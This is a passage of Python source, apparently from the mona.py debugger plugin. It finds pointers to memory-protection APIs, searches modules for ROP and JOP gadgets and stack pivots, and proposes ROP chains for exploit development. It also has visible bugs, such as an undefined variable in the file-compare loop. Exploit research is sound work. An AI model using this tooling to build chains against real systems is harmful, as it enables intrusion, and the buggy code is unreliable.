	for thismodule in modulestosearch:
		if not silent:
			dbg.log("    - Querying module %s" % thismodule)
		dbg.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	if not silent:
		dbg.log("    - Search complete, processing results")
	dbg.updateLog()
	return all_opcodes	


	
def findROPFUNC(modulecriteria={},criteria={},searchfuncs=[]):
	"""
	Performs a search for pointers to pointers to interesting functions to facilitate a ROP exploit

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	optional :
	searchfuncs - array with functions to include in the search

	Return:
	Dictionary (pointers)
	"""
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0
	ropfuncs = {}
	funccallresults = []
	ropfuncoffsets = {}
	functionnames = []
	
	modulestosearch = getModulesToQuery(modulecriteria)
	if searchfuncs == []:
		functionnames = ["virtualprotect","virtualalloc","heapalloc","winexec","setprocessdeppolicy","heapcreate","setinformationprocess","writeprocessmemory","memcpy","memmove","strncpy","createmutex","getlasterror","strcpy","loadlibrary","freelibrary","getmodulehandle","getprocaddress","openfile","createfile","createfilemapping","mapviewoffile","openfilemapping"]
	else:
		functionnames = searchfuncs
	if not silent:
		dbg.log("[+] Looking for pointers to interesting functions...")
	curmod = ""
	#ropfuncfilename="ropfunc.txt"
	#objropfuncfile = MnLog(ropfuncfilename)
	#ropfuncfile = objropfuncfile.reset()
	
	offsets = {}
	
	offsets["kernel32.dll"] = ["virtualprotect","virtualalloc","writeprocessmemory"]
	# on newer OSes, functions are stored in kernelbase.dll
	offsets["kernelbase.dll"] = ["virtualprotect","virtualalloc","writeprocessmemory"]
	
	offsetpointers = {}
	
	# populate absolute pointers
	for themod in offsets:
		fnames = offsets[themod]
		try:
			themodule = MnModule(themod)
			if not themodule is None:
				allfuncs = themodule.getEAT()
				for fn in allfuncs:
					for fname in fnames:
						if allfuncs[fn].lower().find(fname.lower()) > -1:
							fname = allfuncs[fn].lower()
							if not fname in offsetpointers:
								offsetpointers[fname] = fn
							break
		except:
			continue

	isrebased = False
	for key in modulestosearch:
		curmod = dbg.getModule(key)
		#is this module going to get rebase ?
		themodule = MnModule(key)
		isrebased = themodule.isRebase
		if not silent:
			dbg.log("     - Querying %s" % (key))		
		allfuncs = themodule.getIAT()
		dbg.updateLog()
		for fn in allfuncs:
			thisfuncname = allfuncs[fn].lower()
			thisfuncfullname = thisfuncname
			if not meetsCriteria(MnPointer(fn), criteria):
				continue
			ptr = 0
			try:
				ptr=struct.unpack('<L',dbg.readMemory(fn,4))[0]
			except:
				pass
			if ptr != 0:
				# get offset to one of the offset functions
				# where does pointer belong to ?
				pmodname = MnPointer(ptr).belongsTo()
				if pmodname != "":
					if pmodname.lower() in offsets:
						# find distance to each of the interesting functions in this module
						for interestingfunc in offsets[pmodname.lower()]:
							if interestingfunc in offsetpointers:
								offsetvalue = offsetpointers[interestingfunc] - ptr
								operator = ""
								if offsetvalue < 0:
									operator = "-"
								offsetvaluehex = toHex(offsetvalue).replace("-","")
								thetype = "(%s - IAT 0x%s : %s.%s (0x%s), offset to %s.%s (0x%s) : %d (%s0x%s)" % (key,toHex(fn),pmodname,thisfuncfullname,toHex(ptr),pmodname,interestingfunc,toHex(offsetpointers[interestingfunc]),offsetvalue,operator,offsetvaluehex)
								if not thetype in ropfuncoffsets:
									ropfuncoffsets[thetype] = [fn]
				
				# see if it's a function we are looking for
				for funcsearch in functionnames:
					funcsearch = funcsearch.lower()
					if thisfuncname.find(funcsearch) > -1:
						extra = ""
						extrafunc = ""
						if isrebased:
							extra = " [Warning : module is likely to get rebased !]"
							extrafunc = "-rebased"
						if not silent:
							dbg.log("       0x%s : ptr to %s (0x%s) (%s) %s" % (toHex(fn),thisfuncname,toHex(ptr),key,extra))
						logtxt = thisfuncfullname.lower().strip()+extrafunc+" | 0x" + toHex(ptr)
						if logtxt in ropfuncs:
								ropfuncs[logtxt] += [fn]
						else:
								ropfuncs[logtxt] = [fn]
						ptr_counter += 1
						if ptr_to_get > 0 and ptr_counter >= ptr_to_get:
							ropfuncs,ropfuncoffsets
	return ropfuncs,ropfuncoffsets

def assemble(instructions,encoder=""):
	"""
	Assembles one or more instructions to opcodes

	Arguments:
	instructions = the instructions to assemble (separated by #)

	Return:
	Dictionary (pointers)
	"""
	if not silent:
		dbg.log("Opcode results : ")
		dbg.log("---------------- ")
	allopcodes=""

	instructions = instructions.replace('"',"").replace("'","")

	splitter=re.compile('#')
	instructions=splitter.split(instructions)
	for instruct in instructions:
		try:
			instruct = instruct.strip()
			assembled=dbg.assemble(instruct)
			strAssembled=""
			for assemOpc in assembled:
				if (len(hex(ord(assemOpc)))) == 3:
					subAssembled = "\\x0"+hex(ord(assemOpc)).replace('0x','')
					strAssembled = strAssembled+subAssembled
				else:
					strAssembled =  strAssembled+hex(ord(assemOpc)).replace('0x', '\\x')
			if len(strAssembled) < 30:
				if not silent:
					dbg.log(" %s = %s" % (instruct,strAssembled))
				allopcodes=allopcodes+strAssembled
			else:
				if not silent:
					dbg.log(" %s => Unable to assemble this instruction !" % instruct,highlight=1)
		except:
			if not silent:
				dbg.log("   Could not assemble %s " % instruct)
			pass
	if not silent:
		dbg.log(" Full opcode : %s " % allopcodes)
	return allopcodes
	
	
def findROPGADGETS(modulecriteria={},criteria={},endings=[],maxoffset=40,depth=5,split=False,pivotdistance=0,fast=False,mode="all"):
	"""
	Searches for rop gadgets

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	endings - array with all rop gadget endings to look for. Default : RETN and RETN+offsets
	maxoffset - maximum offset value for RETN if endings are set to RETN
	depth - maximum number of instructions to go back
	split - Boolean that indicates whether routine should write all gadgets to one file, or split per module
	pivotdistance - minimum distance a stackpivot needs to be
	fast - Boolean indicating if you want to process less obvious gadgets as well
	mode - internal use only
	
	Return:
	Output is written to files, containing rop gadgets, suggestions, stack pivots and virtualprotect/virtualalloc routine (if possible)
	"""
	
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0

	modulestosearch = getModulesToQuery(modulecriteria)
	
	progressid=str(dbg.getDebuggedPid())
	progressfilename="_rop_progress_"+dbg.getDebuggedName()+"_"+progressid+".log"
	
	objprogressfile = MnLog(progressfilename)
	progressfile = objprogressfile.reset()

	dbg.log("[+] Progress will be written to %s" % progressfilename)
	dbg.log("[+] Maximum offset : %d" % maxoffset)
	dbg.log("[+] (Minimum/optional maximum) stackpivot distance : %s" % str(pivotdistance))
	dbg.log("[+] Max nr of instructions : %d" % depth)
	dbg.log("[+] Split output into module rop files ? %s" % split)

	usefiles = False
	filestouse = []
	vplogtxt = ""
	suggestions = {}
	
	if "f" in criteria:
		if criteria["f"] <> "":
			if type(criteria["f"]).__name__.lower() != "bool":		
				usefiles = True
				rawfilenames = criteria["f"].replace('"',"")
				allfiles = rawfilenames.split(',')
				#check if files exist
				dbg.log("[+] Attempting to use %d rop file(s) as input" % len(allfiles))
				for fname in allfiles:
					fname = fname.strip()
					if not os.path.exists(fname):
						dbg.log("     ** %s : Does not exist !" % fname, highlight=1)
					else:
						filestouse.append(fname)
				if len(filestouse) == 0:
					dbg.log(" ** Unable to find any of the source files, aborting... **", highlight=1)
					return
		
	search = []
	
	if not usefiles:
		if len(endings) == 0:
			#RETN only
			search.append("RETN")
			for i in range(0, maxoffset + 1, 2):
				search.append("RETN 0x"+ toHexByte(i))
		else:
			for ending in endings:
				dbg.log("[+] Custom ending : %s" % ending)
				if ending != "":
					search.append(ending)
		dbg.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
		for thismodule in modulestosearch:
			dbg.log("    - Querying module %s" % thismodule)
			dbg.updateLog()
			#search
			found_opcodes = searchInModule(search,thismodule,criteria)
			#merge results
			all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
		dbg.log("    - Search complete :")
	else:
		dbg.log("[+] Reading input files")
		for filename in filestouse:
			dbg.log("     - Reading %s" % filename)
			all_opcodes = mergeOpcodes(all_opcodes,readGadgetsFromFile(filename))
			
	dbg.updateLog()
	tp = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			if usefiles:
				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) / 2))
				tp = tp + len(all_opcodes[endingtype]) / 2
			else:
				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
				tp = tp + len(all_opcodes[endingtype])
	global silent
	if not usefiles:		
		dbg.log("    - Filtering and mutating %d gadgets" % tp)
	else:
		dbg.log("    - Categorizing %d gadgets" % tp)
		silent = True
	dbg.updateLog()
	ropgadgets = {}
	interestinggadgets = {}
	stackpivots = {}
	stackpivots_safeseh = {}
	adcnt = 0
	tc = 1
	issafeseh = False
	step = 0
	updateth = 1000
	if (tp >= 2000 and tp < 5000):
		updateth = 500
	if (tp < 2000):
		updateth = 100
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			for endingtypeptr in all_opcodes[endingtype]:
				adcnt=adcnt+1
				if usefiles:
					adcnt = adcnt - 0.5
				if adcnt > (tc*updateth):
					thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
					updatetext = "      - Progress update : " + str(tc*updateth) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (" + str((tc*updateth*100)/tp)+"%)"
					objprogressfile.write(updatetext.strip(),progressfile)
					dbg.log(updatetext)
					dbg.updateLog()
					tc += 1				
				if not usefiles:
					#first get max backward instruction
					thisopcode = dbg.disasmBackward(endingtypeptr,depth+1)
					thisptr = thisopcode.getAddress()

					# we now have a range to mine
					startptr = thisptr
					currentmodulename = MnPointer(thisptr).belongsTo()
					modinfo = MnModule(currentmodulename)
					issafeseh = modinfo.isSafeSEH
					while startptr <= endingtypeptr and startptr != 0x0:
						# get the entire chain from startptr to endingtypeptr
						thischain = ""
						msfchain = []
						thisopcodebytes = ""
						chainptr = startptr
						if isGoodGadgetPtr(startptr,criteria) and not startptr in ropgadgets and not startptr in interestinggadgets:
							invalidinstr = False
							while chainptr < endingtypeptr and not invalidinstr:
								thisopcode = dbg.disasm(chainptr)
								thisinstruction = thisopcode.getDisasm()
								if isGoodGadgetInstr(thisinstruction) and not isGadgetEnding(thisinstruction,search):						
									thischain =  thischain + " # " + thisinstruction
									msfchain.append([chainptr,thisinstruction])
									thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
									chainptr = dbg.disasmForwardAddressOnly(chainptr,1)
								else:
									invalidinstr = True						
							if endingtypeptr == chainptr and startptr != chainptr and not invalidinstr:
								fullchain = thischain + " # " + endingtype
								msfchain.append([endingtypeptr,endingtype])
								thisopcode = dbg.disasm(endingtypeptr)
								thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
								msfchain.append(["raw",thisopcodebytes])
								if isInterestingGadget(fullchain):
									interestinggadgets[startptr] = fullchain
									#this may be a good stackpivot too
									stackpivotdistance = getStackPivotDistance(fullchain,pivotdistance) 
									if stackpivotdistance > 0:
										#safeseh or not ?
										if issafeseh:
											if not stackpivotdistance in stackpivots_safeseh:
												stackpivots_safeseh.setdefault(stackpivotdistance,[[startptr,fullchain]])
											else:
												stackpivots_safeseh[stackpivotdistance] += [[startptr,fullchain]]
										else:
											if not stackpivotdistance in stackpivots:
												stackpivots.setdefault(stackpivotdistance,[[startptr,fullchain]])
											else:
												stackpivots[stackpivotdistance] += [[startptr,fullchain]]								
								else:
									if not fast:
										ropgadgets[startptr] = fullchain
						startptr = startptr+1
						
				else:
					if step == 0:
						startptr = endingtypeptr
					if step == 1:
						thischain = endingtypeptr
						chainptr = startptr
						ptrx = MnPointer(chainptr)
						modname = ptrx.belongsTo()
						issafeseh = False
						if modname != "":
							thism = MnModule(modname)
							issafeseh = thism.isSafeSEH
						if isGoodGadgetPtr(startptr,criteria) and not startptr in ropgadgets and not startptr in interestinggadgets:
							fullchain = thischain
							if isInterestingGadget(fullchain):
								interestinggadgets[startptr] = fullchain
								#this may be a good stackpivot too
								stackpivotdistance = getStackPivotDistance(fullchain,pivotdistance) 
								if stackpivotdistance > 0:
									#safeseh or not ?
									if issafeseh:
										if not stackpivotdistance in stackpivots_safeseh:
											stackpivots_safeseh.setdefault(stackpivotdistance,[[startptr,fullchain]])
										else:
											stackpivots_safeseh[stackpivotdistance] += [[startptr,fullchain]]
									else:
										if not stackpivotdistance in stackpivots:
											stackpivots.setdefault(stackpivotdistance,[[startptr,fullchain]])
										else:
											stackpivots[stackpivotdistance] += [[startptr,fullchain]]	
							else:
								if not fast:
									ropgadgets[startptr] = fullchain
						step = -1
					step += 1
	
	thistimestamp = datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
	updatetext = "      - Progress update : " + str(tp) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (100%)"
	objprogressfile.write(updatetext.strip(),progressfile)
	dbg.log(updatetext)
	dbg.updateLog()

	if mode == "all":
		# another round of filtering
		updatetext = "[+] Creating suggestions list"
		dbg.log(updatetext)
		objprogressfile.write(updatetext.strip(),progressfile)
		suggestions = getRopSuggestion(interestinggadgets,ropgadgets)
		#see if we can propose something
		updatetext = "[+] Processing suggestions"
		dbg.log(updatetext)
		objprogressfile.write(updatetext.strip(),progressfile)
		suggtowrite=""
		for suggestedtype in suggestions:
			if suggestedtype.find("pop ") == -1:		#too many, don't write to file
				suggtowrite += "[%s]\n" % suggestedtype
				for suggestedpointer in suggestions[suggestedtype]:
					sptr = MnPointer(suggestedpointer)
					modname = sptr.belongsTo()
					modinfo = MnModule(modname)
					rva = suggestedpointer - modinfo.moduleBase	
					suggesteddata = suggestions[suggestedtype][suggestedpointer]
					ptrinfo = "0x" + toHex(suggestedpointer) + " (RVA : 0x" + toHex(rva) + ") : " + suggesteddata + "    ** [" + modname + "] **   |  " + sptr.__str__()+"\n"
					suggtowrite += ptrinfo
		dbg.log("[+] Launching ROP generator")
		updatetext = "Attempting to create rop chain proposals"
		objprogressfile.write(updatetext.strip(),progressfile)
		vplogtxt = createRopChains(suggestions,interestinggadgets,ropgadgets,modulecriteria,criteria,objprogressfile,progressfile)
		dbg.logLines(vplogtxt.replace("\t","    "))
		dbg.log("    ROP generator finished")
	
	#done, write to log files
	dbg.setStatusBar("Writing to logfiles...")
	dbg.log("")
	logfile = MnLog("stackpivot.txt")
	thislog = logfile.reset()	
	objprogressfile.write("Writing " + str(len(stackpivots)+len(stackpivots_safeseh))+" stackpivots with minimum offset " + str(pivotdistance)+" to file " + thislog,progressfile)
	dbg.log("[+] Writing stackpivots to file " + thislog)
	logfile.write("Stack pivots, minimum distance " + str(pivotdistance),thislog)
	logfile.write("-------------------------------------",thislog)
	logfile.write("Non-safeSEH protected pivots :",thislog)
	logfile.write("------------------------------",thislog)
	arrtowrite = ""	
	pivotcount = 0
	try:
		with open(thislog,"a") as fh:
			arrtowrite = ""
			stackpivots_index = sorted(stackpivots) # returns sorted keys as an array
			for sdist in stackpivots_index:
				for spivot, schain in stackpivots[sdist]:
					ptrx = MnPointer(spivot)
					modname = ptrx.belongsTo()
					sdisthex = "%02x" % sdist
					ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
					pivotcount += 1
					arrtowrite += ptrinfo
			fh.writelines(arrtowrite)
	except:
		pass
	logfile.write("SafeSEH protected pivots :",thislog)
	logfile.write("--------------------------",thislog)	
	arrtowrite = ""	
	try:
		with open(thislog, "a") as fh:
			arrtowrite = ""
			stackpivots_safeseh_index = sorted(stackpivots_safeseh)
			for sdist in stackpivots_safeseh_index:
				for spivot, schain in stackpivots_safeseh[sdist]:
					ptrx = MnPointer(spivot)
					modname = ptrx.belongsTo()
					#modinfo = MnModule(modname)
					sdisthex = "%02x" % sdist
					ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
					pivotcount += 1
					arrtowrite += ptrinfo
			fh.writelines(arrtowrite)
	except:
		pass	
	dbg.log("    Wrote %d pivots to file " % pivotcount)
	arrtowrite = ""
	if mode == "all":
		if len(suggestions) > 0:
			logfile = MnLog("rop_suggestions.txt")
			thislog = logfile.reset()
			objprogressfile.write("Writing all suggestions to file "+thislog,progressfile)
			dbg.log("[+] Writing suggestions to file " + thislog )
			logfile.write("Suggestions",thislog)
			logfile.write("-----------",thislog)
			with open(thislog, "a") as fh:
				fh.writelines(suggtowrite)
				fh.write("\n")
			nrsugg = len(suggtowrite.split("\n"))
			dbg.log("    Wrote %d suggestions to file" % nrsugg)
		if not split:
			logfile = MnLog("rop.txt")
			thislog = logfile.reset()
			objprogressfile.write("Gathering interesting gadgets",progressfile)
			dbg.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
			logfile.write("Interesting gadgets",thislog)
			logfile.write("-------------------",thislog)
			dbg.updateLog()
			try:
				with open(thislog, "a") as fh:
					arrtowrite = ""
					for gadget in interestinggadgets:
							ptrx = MnPointer(gadget)
							modname = ptrx.belongsTo()
							#modinfo = MnModule(modname)
							ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
							arrtowrite += ptrinfo
					objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
					fh.writelines(arrtowrite)
				dbg.log("    Wrote %d interesting gadgets to file" % len(interestinggadgets))
			except:
				pass
			arrtowrite=""
			if not fast:
				objprogressfile.write("Enumerating other gadgets (" + str(len(ropgadgets))+")",progressfile)
				dbg.log("[+] Writing other gadgets to file " + thislog + " (" + str(len(ropgadgets))+" gadgets)")
				try:
					logfile.write("",thislog)
					logfile.write("Other gadgets",thislog)
					logfile.write("-------------",thislog)
					with open(thislog, "a") as fh:
						arrtowrite=""
						for gadget in ropgadgets:
								ptrx = MnPointer(gadget)
								modname = ptrx.belongsTo()
								#modinfo = MnModule(modname)
								ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
								arrtowrite += ptrinfo
						dbg.log("    Wrote %d other gadgets to file" % len(ropgadgets))
						objprogressfile.write("Writing results to file " + thislog + " (" + str(len(ropgadgets))+" other gadgets)",progressfile)
						fh.writelines(arrtowrite)
				except:
					pass
			
		else:
			dbg.log("[+] Writing results to individual files (grouped by module)")
			dbg.updateLog()
			for thismodule in modulestosearch:
				thismodname = thismodule.replace(" ","_")
				thismodversion = getModuleProperty(thismodule,"version")
				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
				thislog = logfile.reset()
				logfile.write("Interesting gadgets",thislog)
				logfile.write("-------------------",thislog)
			for gadget in interestinggadgets:
				ptrx = MnPointer(gadget)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				thismodversion = getModuleProperty(modname,"version")
				thismodname = modname.replace(" ","_")
				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
				thislog = logfile.reset(False)
				ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
				with open(thislog, "a") as fh:
					fh.write(ptrinfo)
			if not fast:
				for thismodule in modulestosearch:
					thismodname = thismodule.replace(" ","_")
					thismodversion = getModuleProperty(thismodule,"version")
					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
					logfile.write("Other gadgets",thislog)
					logfile.write("-------------",thislog)
				for gadget in ropgadgets:
					ptrx = MnPointer(gadget)
					modname = ptrx.belongsTo()
					modinfo = MnModule(modname)
					thismodversion = getModuleProperty(modname,"version")
					thismodname = modname.replace(" ","_")
					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
					thislog = logfile.reset(False)
					ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
					with open(thislog, "a") as fh:
						fh.write(ptrinfo)
	thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
	objprogressfile.write("Done (" + thistimestamp+")",progressfile)
	dbg.log("Done")
	return interestinggadgets,ropgadgets,suggestions,vplogtxt
	
	#----- JOP gadget finder ----- #
			
def findJOPGADGETS(modulecriteria={},criteria={},depth=6):
	"""
	Searches for jop gadgets

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	depth - maximum number of instructions to go back
	
	Return:
	Output is written to files, containing jop gadgets and suggestions
	"""
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0
	
	modulestosearch = getModulesToQuery(modulecriteria)
	
	progressid=toHex(dbg.getDebuggedPid())
	progressfilename="_jop_progress_"+dbg.getDebuggedName()+"_"+progressid+".log"
	
	objprogressfile = MnLog(progressfilename)
	progressfile = objprogressfile.reset()

	dbg.log("[+] Progress will be written to %s" % progressfilename)
	dbg.log("[+] Max nr of instructions : %d" % depth)

	filesok = 0
	usefiles = False
	filestouse = []
	vplogtxt = ""
	suggestions = {}
	fast = False
	
	search = []
	
	jopregs = ["EAX","EBX","ECX","EDX","ESI","EDI","EBP"]
	
	offsetval = 0
	
	for jreg in jopregs:
		search.append("JMP " + jreg)
		search.append("JMP [" + jreg + "]")
		for offsetval in range(0, 40+1, 2):
			search.append("JMP [" + jreg + "+0x" + toHexByte(offsetval)+"]")

	search.append("JMP [ESP]")
		
	for offsetval in range(0, 40+1, 2):
		search.append("JMP [ESP+0x" + toHexByte(offsetval) + "]")
	
	dbg.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
	for thismodule in modulestosearch:
		dbg.log("    - Querying module %s" % thismodule)
		dbg.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	dbg.log("    - Search complete :")
			
	dbg.updateLog()
	tp = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			if usefiles:
				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) / 2))
				tp = tp + len(all_opcodes[endingtype]) / 2
			else:
				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
				tp = tp + len(all_opcodes[endingtype])
	global silent
	dbg.log("    - Filtering and mutating %d gadgets" % tp)
		
	dbg.updateLog()
	jopgadgets = {}
	interestinggadgets = {}

	adcnt = 0
	tc = 1
	issafeseh = False
	step = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			for endingtypeptr in all_opcodes[endingtype]:
				adcnt += 1
				if usefiles:
					adcnt = adcnt - 0.5
				if adcnt > (tc*1000):
					thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
					updatetext = "      - Progress update : " + str(tc*1000) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (" + str((tc*1000*100)/tp)+"%)"
					objprogressfile.write(updatetext.strip(),progressfile)
					dbg.log(updatetext)
					dbg.updateLog()
					tc += 1			
				#first get max backward instruction
				thisopcode = dbg.disasmBackward(endingtypeptr,depth+1)
				thisptr = thisopcode.getAddress()
				# we now have a range to mine
				startptr = thisptr

				while startptr <= endingtypeptr and startptr != 0x0:
					# get the entire chain from startptr to endingtypeptr
					thischain = ""
					msfchain = []
					thisopcodebytes = ""
					chainptr = startptr
					if isGoodGadgetPtr(startptr,criteria) and not startptr in jopgadgets and not startptr in interestinggadgets:
						# new pointer
						invalidinstr = False
						while chainptr < endingtypeptr and not invalidinstr:
							thisopcode = dbg.disasm(chainptr)
							thisinstruction = thisopcode.getDisasm()
							if isGoodJopGadgetInstr(thisinstruction) and not isGadgetEnding(thisinstruction,search):
								thischain =  thischain + " # " + thisinstruction
								msfchain.append([chainptr,thisinstruction])
								thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
								chainptr = dbg.disasmForwardAddressOnly(chainptr,1)
							else:
								invalidinstr = True
						if endingtypeptr == chainptr and startptr != chainptr and not invalidinstr:
							fullchain = thischain + " # " + endingtype
							msfchain.append([endingtypeptr,endingtype])
							thisopcode = dbg.disasm(endingtypeptr)
							thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
							msfchain.append(["raw",thisopcodebytes])
							if isInterestingJopGadget(fullchain):					
								interestinggadgets[startptr] = fullchain
							else:
								if not fast:
									jopgadgets[startptr] = fullchain
					startptr = startptr+1
	
	thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
	updatetext = "      - Progress update : " + str(tp) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (100%)"
	objprogressfile.write(updatetext.strip(),progressfile)
	dbg.log(updatetext)
	dbg.updateLog()

	logfile = MnLog("jop.txt")
	thislog = logfile.reset()
	objprogressfile.write("Enumerating gadgets",progressfile)
	dbg.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
	logfile.write("Interesting gadgets",thislog)
	logfile.write("-------------------",thislog)
	dbg.updateLog()
	arrtowrite = ""
	try:
		with open(thislog, "a") as fh:
			arrtowrite = ""
			for gadget in interestinggadgets:
					ptrx = MnPointer(gadget)
					modname = ptrx.belongsTo()
					modinfo = MnModule(modname)
					ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
					arrtowrite += ptrinfo
			objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
			fh.writelines(arrtowrite)
	except:
		pass				

	return interestinggadgets,jopgadgets,suggestions,vplogtxt	
	

	#----- File compare ----- #

def findFILECOMPARISON(modulecriteria={},criteria={},allfiles=[],tomatch="",checkstrict=True,rangeval=0):
	"""
	Compares two or more files generated with mona.py and lists the entries that have been found in all files

	Arguments:
	modulecriteria =  not used
	criteria = not used
	allfiles = array with filenames to compare
	tomatch = variable containing a string each line should contain
	checkstrict = Boolean, when set to True, both the pointer and the instructions should be exactly the same
	
	Return:
	File containing all matching pointers
	"""
	dbg.setStatusBar("Comparing files...")	
	dbg.updateLog()

	nofiles = True
	for fcnt in xrange(len(allfiles)):
		fname = fname.strip()
		if os.path.exists(fname):
			dbg.log("     - %d. %s" % (fcnt, allfiles[fcnt]))

			nofiles = False
		else:
			dbg.log("     ** %s : Does not exist !" % allfiles[fcnt], highlight=1)
	if nofiles:
		return
	objcomparefile = MnLog("filecompare.txt")
	comparefile = objcomparefile.reset()
	objcomparefilenot = MnLog("filecompare_not.txt")
	comparefilenot = objcomparefilenot.reset()
	objcomparefilenot.write("Source files:",comparefilenot)
	for fcnt in xrange(len(allfiles)):
		objcomparefile.write(" - " + str(fcnt)+". "+allfiles[fcnt],comparefile)
		objcomparefilenot.write(" - " + str(fcnt)+". "+allfiles[fcnt],comparefilenot)
	objcomparefile.write("",comparefile)
	objcomparefile.write("Pointers found :",comparefile)
	objcomparefile.write("----------------",comparefile)
	objcomparefilenot.write("",comparefilenot)
	objcomparefilenot.write("Pointers not found :",comparefilenot)
	objcomparefilenot.write("-------------------",comparefilenot)
	dbg.log("Reading reference file %s " % allfiles[0])
	dbg.updateLog()
	#open reference file and read all records that contain a pointers
	with open(allfiles[0], "rb") as reffile:
		refcontent = reffile.readlines()
	#read all other files into a big array
	targetfiles=[]
	filecnt=1
	comppointers=0
	comppointers_not=0
	dbg.log("Reading other files...")
	dbg.updateLog()
	while filecnt < len(allfiles):
		dbg.log("   %s" % allfiles[filecnt])
		dbg.updateLog()
		targetfiles.append([])
		tfile=open(allfiles[filecnt],"rb")
		tcontent = tfile.readlines()
		tfile.close()
		nrlines=0
		for myLine in tcontent:
			targetfiles[filecnt-1].append(myLine)
			nrlines=nrlines+1
		filecnt=filecnt+1
	totalptr=0
	dbg.log("Starting compare operation, please wait...")
	dbg.updateLog()
	stopnow = False	
	if rangeval == 0:
		for thisLine in refcontent:
			outtofile = "\n0. "+thisLine.replace("\n","").replace("\r","")
			if ((tomatch != "" and thisLine.upper().find(tomatch.upper()) > -1) or tomatch == "") and not stopnow:
				refpointer=""
				pointerfound=1  #pointer is in source file for sure
				#is this a pointer line ?
				refpointer,instr = splitToPtrInstr(thisLine)
				if refpointer != -1:
						totalptr=totalptr+1
						filecnt=0  #0 is actually the second file
						#is this a pointer which meets the criteria ?
						ptrx = MnPointer(refpointer)
						if meetsCriteria(ptrx,criteria):
							while filecnt < len(allfiles)-1 :
								foundinfile=0
								foundline = ""
								for srcLine in targetfiles[filecnt]:
									refpointer2,instr2 = splitToPtrInstr(srcLine)
									if refpointer == refpointer2:
										foundinfile=1
										foundline = srcLine	
										break
								if checkstrict and foundinfile == 1:
									# do instructions match ?
									foundinfile = 0
									refpointer2,instr2 = splitToPtrInstr(foundline)
									if (refpointer == refpointer2) and (instr.lower() == instr2.lower()):
										outtofile += "\n" + str(filecnt+1)+". "+foundline.replace("\n","").replace("\r","")										
										foundinfile = 1
								else:
									if foundinfile == 1:
										outtofile += "\n" + str(filecnt+1)+". "+foundline.replace("\n","").replace("\r","")
								if not foundinfile == 1:
									break	#no need to check other files if any
								pointerfound=pointerfound+foundinfile
								filecnt=filecnt+1
						#search done
